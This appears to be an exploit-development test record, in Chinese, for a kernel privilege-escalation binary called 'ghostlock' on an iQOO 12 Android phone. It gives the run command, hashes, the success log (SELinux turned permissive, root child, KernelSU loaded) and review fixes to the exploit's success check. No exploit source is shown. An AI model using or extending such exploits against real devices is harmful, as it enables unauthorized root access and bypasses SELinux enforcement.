# ANC-02 真机门禁：review 修正后的 multicast_waiter（direct）— PASS

对应提交 `ff2bd110`（`test(extract): cover the missing vr layout in the required-field check`，评审
修正批次 tip；攻击路径修正为 `e493f110`）。候选二进制 `build/native/ghostlock`
SHA-256 `9cfd7c83a3779589a8cb235e681173c50e07b04443a3b6def955a7796401052c`
（md5 `162579ac9bfbe2cc4d386f7c8f76de2b`）。设备端 profile md5
`3dea70aa29a9abc2878f32c96e9b68eb`（内置 `6.1.145-android14-11-maybe-dirty` 的导出文档，
`recommended_cpus` 为实测的 4/5）。

## 设备与入口

- 型号 V2307A / PD2307（iQOO 12，12GB）；`uname -r` = `6.1.145-android14-11-maybe-dirty`。
- 入口：CLI，`GHOSTLOCK_HOME=/data/local/tmp ./ghostlock-pr --load-prebuilt-profile pr-profile.bin
  --dump-kernel-log /data/local/tmp/glk-debug`；KernelSU 未加载的冷启动、锁屏未解锁、
  单 route（multicast_waiter）、CPU 对 4/5（来自 profile）；运行起步 `boot_ms=78865`（≈79s）。
- 设备端二进制 md5 与本地一致（`162579ac…`，见 `push_hashes.txt`）。

## 结果

第 1 次尝试即 PASS（`gate-logs/gate2/pass.stdout.log`）：

```
[*] cpu pair: main=4 consumer=5
[+] startup context pid=13043 uid=2000 ... attr=u:r:shell:s0 enforce=1  (boot_ms=78865)
[*] multicast route status=0 clean=1/1 step=0 sockopt=-1 errno=0 attempts=16 calls=1 success=1
[+] SELinux permissive
[+] vr guard: sys_exit probe disabled (attempt 1)
[+] child is root!
[*] [T+32853ms] exploit complete
[*] enforce=1 (enforcing)
[+] KernelSU ready
```

事后核对（设备未 panic）：`su -c id` → `uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0`
（连续 3 次 `id -u` = 0）；`kernelsu 217088 1 - Live`；SELinux 回到 Enforcing；管理器
`me.weishu.kernelsu` 在位。

### 本记录针对的评审修正

- `e493f110`：`ROUTE_OK` 只由 consumer 的验证写入决定。新增的日志字段在本次运行为
  `sockopt=-1`（`setsockopt` 返回 `-EADDRNOTAVAIL`，即"拷贝已落位"的那条路径）而 `success=1`
  —— 修复后 `status=0` 单独由 consumer 的验证信号支撑，不再依赖 syscall 返码。
- 其余四项（提取器可选性与宽度、共享校验、CPU 配对来源、非 conf 格式）不改变本机攻击行为，
  由单元/构建/静态检查覆盖（见计划文档的 review 修正表）。

## 日志

- `gate-logs/gate2/`：`pass.stdout.log`（成功全程）、`attempt1.stdout.log`（同一次）、
  `post_state.txt`（su / 模块 / enforce / 管理器 / ksud 日志）、`push_hashes.txt`、
  `glk-debug/`（`--dump-kernel-log` 证据包）。
- 设备侧：`/data/local/tmp/.ghostlock_ksu.log`（`late-load kmi=android14-6.1`、`late-load exit=0`、
  `[+] KernelSU module loaded`）。

## 变更说明

- 验证对象：评审修正后的最终二进制。路由判据改为"仅 consumer 的验证写入"，日志保留
  `sockopt=` 供对照；运行结果与 ANC-01 一致（`child is root!` → `KernelSU ready`），
  设备稳定。
- 与 ANC-01 的差异：候选二进制含 5 项 review 修正；设备、入口与条件相同。
